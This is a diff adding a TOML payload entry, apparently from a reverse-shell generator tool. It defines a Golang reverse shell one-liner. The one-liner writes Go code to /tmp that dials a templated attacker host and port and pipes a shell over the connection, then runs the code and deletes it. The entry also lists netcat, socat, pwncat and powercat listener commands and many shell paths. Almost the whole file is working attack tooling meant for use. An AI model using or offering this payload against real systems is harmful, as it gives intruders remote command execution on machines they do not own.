@@ -1,0 +1,38 @@
+id = "golang"
+name = "Golang"
+os = "all"
+type = "reverse"
+proto = "tcp"
+lang = "go"
+description = "Golang reverse shell using net.Dial and exec.Command. Works on Linux, Mac, and Windows."
+
+payload = "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{{LHOST}}:{{LPORT}}\");cmd:=exec.Command(\"{{SHELL}}\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
+
+[listeners]
+nc = "nc -lvnp {{LPORT}}"
+nc_freebsd = "nc -lvn {{LPORT}}"
+busybox_nc = "busybox nc -lp {{LPORT}}"
+ncat = "ncat -lvnp {{LPORT}}"
+ncat_exe = "ncat.exe -lvnp {{LPORT}}"
+rlwrap_nc = "rlwrap -cAr nc -lvnp {{LPORT}}"
+rustcat = "rcat listen {{LPORT}}"
+pwncat = "python3 -m pwncat -lp {{LPORT}}"
+socat = "socat -d -d TCP-LISTEN:{{LPORT}} STDOUT"
+socat_tty = "socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{{LPORT}}"
+powercat = "powercat -l -p {{LPORT}}"
+
+[shells]
+compatible = [
+    "/usr/bin/env bash", "bash", "/bin/bash", "/usr/bin/bash", "/usr/local/bin/bash", "/opt/homebrew/bin/bash", "/opt/local/bin/bash", "/snap/bin/bash", "/usr/sbin/bash", "/sbin/bash", "env bash",
+    "/usr/bin/env sh", "sh", "/bin/sh", "/usr/bin/sh", "/usr/local/bin/sh", "/opt/homebrew/bin/sh", "/opt/local/bin/sh", "/snap/bin/sh", "/usr/sbin/sh", "/sbin/sh", "env sh",
+    "/usr/bin/env dash", "dash", "/bin/dash", "/usr/bin/dash", "/usr/local/bin/dash", "/opt/homebrew/bin/dash", "/opt/local/bin/dash", "/snap/bin/dash", "/usr/sbin/dash", "/sbin/dash", "env dash",
+    "/usr/bin/env ash", "ash", "/bin/ash", "/usr/bin/ash", "/usr/local/bin/ash", "/opt/homebrew/bin/ash", "/opt/local/bin/ash", "/snap/bin/ash", "/usr/sbin/ash", "/sbin/ash", "env ash", "busybox sh",
+    "/usr/bin/env bsh", "bsh", "/bin/bsh", "/usr/bin/bsh", "/usr/local/bin/bsh", "/opt/homebrew/bin/bsh", "/opt/local/bin/bsh", "/snap/bin/bsh", "/usr/sbin/bsh", "/sbin/bsh", "env bsh",
+    "/usr/bin/env csh", "csh", "/bin/csh", "/usr/bin/csh", "/usr/local/bin/csh", "/opt/homebrew/bin/csh", "/opt/local/bin/csh", "/snap/bin/csh", "/usr/sbin/csh", "/sbin/csh", "env csh",
+    "/usr/bin/env tcsh", "tcsh", "/bin/tcsh", "/usr/bin/tcsh", "/usr/local/bin/tcsh", "/opt/homebrew/bin/tcsh", "/opt/local/bin/tcsh", "/snap/bin/tcsh", "/usr/sbin/tcsh", "/sbin/tcsh", "env tcsh",
+    "/usr/bin/env ksh", "ksh", "/bin/ksh", "/usr/bin/ksh", "/usr/local/bin/ksh", "/opt/homebrew/bin/ksh", "/opt/local/bin/ksh", "/snap/bin/ksh", "/usr/sbin/ksh", "/sbin/ksh", "env ksh",
+    "/usr/bin/env pdksh", "pdksh", "/bin/pdksh", "/usr/bin/pdksh", "/usr/local/bin/pdksh", "/opt/homebrew/bin/pdksh", "/opt/local/bin/pdksh", "/snap/bin/pdksh", "/usr/sbin/pdksh", "/sbin/pdksh", "env pdksh",
+    "/usr/bin/env mksh", "mksh", "/bin/mksh", "/usr/bin/mksh", "/usr/local/bin/mksh", "/opt/homebrew/bin/mksh", "/opt/local/bin/mksh", "/snap/bin/mksh", "/usr/sbin/mksh", "/sbin/mksh", "env mksh",
+    "/usr/bin/env zsh", "zsh", "/bin/zsh", "/usr/bin/zsh", "/usr/local/bin/zsh", "/opt/homebrew/bin/zsh", "/opt/local/bin/zsh", "/snap/bin/zsh", "/usr/sbin/zsh", "/sbin/zsh", "env zsh"
+]
+default = "/bin/sh"
